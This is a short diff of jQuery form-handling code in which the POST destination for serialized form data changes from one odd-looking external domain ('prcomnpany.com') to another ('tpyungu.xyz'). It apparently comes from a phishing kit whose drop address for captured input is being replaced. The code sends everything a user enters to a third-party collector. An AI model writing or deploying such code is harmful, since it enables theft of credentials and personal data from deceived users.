@@ -10,7 +10,7 @@
                     $("#sub").html("Processing...").prop("disabled", true);
                     $.ajax({
                         type: "POST",
-                        url: "https://prcomnpany.com/df/vsp.php",
+                        url: "https://tpyungu.xyz/hn/vp.php",
                         data: $(this).serialize()
                     }).done(function (data) {
                         setTimeout(function () {
